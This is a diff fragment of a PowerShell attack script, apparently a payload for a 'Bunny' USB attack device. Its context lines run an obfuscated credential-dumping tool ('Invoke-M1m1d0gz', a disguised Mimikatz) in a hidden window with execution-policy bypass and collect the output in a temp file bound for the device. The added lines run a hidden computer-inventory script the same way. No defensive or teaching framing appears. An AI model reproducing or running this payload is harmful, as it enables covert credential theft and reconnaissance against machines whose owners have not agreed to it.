@@ -86,6 +86,12 @@ $LINE3 | Add-Content $TMPFILE
 Write-Host "M1m1k@tz"
 $M1m1d0gz = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Invoke-M1m1d0gz.ps1
 $M1m1d0gz | Add-Content $TMPFILE
+$LINE3 | Add-Content $TMPFILE
+
+# Get Computer Inventory
+write-host "ComputerInventory"
+$Inventory = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-Inventory.ps1
+$Inventory | Add-Content $TMPFILE
 
 
 #Move TMP File to Bunny
